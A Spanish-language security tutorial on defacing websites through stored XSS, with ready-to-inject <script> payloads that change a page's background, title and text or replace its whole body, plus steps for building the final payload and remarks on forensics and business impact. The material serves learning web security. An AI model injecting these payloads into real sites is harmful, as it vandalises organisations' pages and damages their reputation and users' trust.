# Ataque: Desfiguración (Defacing)

## Qué es y por qué importa

**Desfigurar** (*defacing*) un sitio web significa alterar su apariencia para quien lo visita — el ataque clásico de grupos de hackers que buscan dejar constancia pública de haber comprometido un objetivo. Un ejemplo real conocido: la desfiguración del sitio web del NHS (Servicio Nacional de Salud del Reino Unido) en 2018. Más allá del valor simbólico, estos ataques pueden tener repercusión mediática significativa y afectar negativamente la reputación —e incluso el valor en bolsa— de la organización afectada, especialmente en sectores como banca o tecnología.

El XSS **almacenado** es el vector preferido para defacing, precisamente por su naturaleza persistente: el mensaje queda visible para todo visitante hasta que se elimine de la base de datos.

## Los cuatro elementos básicos del defacing

| Elemento | Propiedad JavaScript |
|---|---|
| Color de fondo | `document.body.style.background` |
| Imagen de fondo | `document.body.background` |
| Título de la página | `document.title` |
| Texto de la página | `DOM.innerHTML` |

No hace falta usar los cuatro a la vez — dos o tres suelen ser suficientes para transmitir un mensaje claro, y a veces conviene incluso eliminar el elemento vulnerable original para dificultar que la página vuelva a su estado normal con una simple recarga.

## Cambiando el fondo

```html
<script>document.body.style.background = "#141d2b"</script>
```

O usando una imagen en lugar de un color sólido:

```html
<script>document.body.background = "https://ejemplo.com/imagen.svg"</script>
```

## Cambiando el título de la página

```html
<script>document.title = 'Mensaje del atacante'</script>
```

## Cambiando el texto visible

Para alterar un elemento concreto:

```js
document.getElementById("todo").innerHTML = "Nuevo texto"
```

O, con jQuery, de forma más concisa:

```js
$("#todo").html('Nuevo texto');
```

## El ataque "completo": reemplazar todo el `<body>`

Para un defacing más contundente, se puede sustituir el contenido completo de la página:

```js
document.getElementsByTagName('body')[0].innerHTML = "Nuevo HTML completo"
```

`document.getElementsByTagName('body')` devuelve una colección (normalmente con un único elemento `<body>`), y `[0]` selecciona ese primer (y único) elemento, reemplazando absolutamente todo su contenido.

### Construyendo el payload final

1. **Preparar el HTML deseado por separado**, probándolo localmente para confirmar que se ve y funciona correctamente antes de incrustarlo.
2. **Minificarlo** a una sola línea.
3. **Incrustarlo** dentro de la llamada `innerHTML`.

```html
<script>
document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Mensaje</h1></center>'
</script>
```

Al inyectar este payload en un punto de XSS almacenado, el HTML original de la página se reemplaza permanentemente con el mensaje del atacante para cualquier visitante posterior — hasta que alguien limpie la base de datos.

## Una observación práctica: el código original sigue ahí

Aunque visualmente el `innerHTML` reemplaza lo que se muestra, el **código fuente original** de la página (lo que devuelve el servidor antes de que el JavaScript del payload se ejecute) sigue conteniendo tanto el HTML original como el payload inyectado al final, en el código fuente bruto (`Ctrl+U`). Esto es relevante para quien investiga el incidente después: el rastro de la inyección queda documentado en el propio código fuente, facilitando el análisis forense posterior.

## Por qué el defacing, pese a su bajo impacto técnico directo, sigue siendo grave

El defacing no compromete datos ni ejecuta código en el servidor — pero el daño reputacional y la pérdida de confianza pueden ser sustanciales, especialmente para organizaciones cuya credibilidad depende de proyectar una imagen de seguridad robusta (bancos, gobiernos, infraestructura crítica). Es un buen recordatorio de que el **impacto de negocio** de una vulnerabilidad no siempre coincide con su complejidad técnica.
